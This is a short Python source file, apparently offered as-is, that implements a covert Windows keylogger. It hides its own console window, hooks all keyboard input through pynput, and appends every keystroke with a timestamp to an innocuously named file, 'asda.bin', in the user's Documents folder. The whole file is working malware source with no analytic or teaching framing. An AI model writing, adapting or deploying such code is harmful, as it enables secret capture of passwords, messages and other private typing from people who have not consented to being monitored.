import os
import ctypes
from pynput import keyboard
from datetime import datetime

LOG_FILE = os.path.expanduser(r"~\Documents\asda.bin")

def hide_console():
    ctypes.windll.kernel32.FreeConsole()

def log_key(key):
    with open(LOG_FILE, "a") as file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"[{timestamp}] {str(key)}\n")
        file.flush()

def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def set_hook():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    hide_console()
    set_hook()

if __name__ == "__main__":
    if not os.path.exists(os.path.dirname(LOG_FILE)):
        os.makedirs(os.path.dirname(LOG_FILE))
    main()

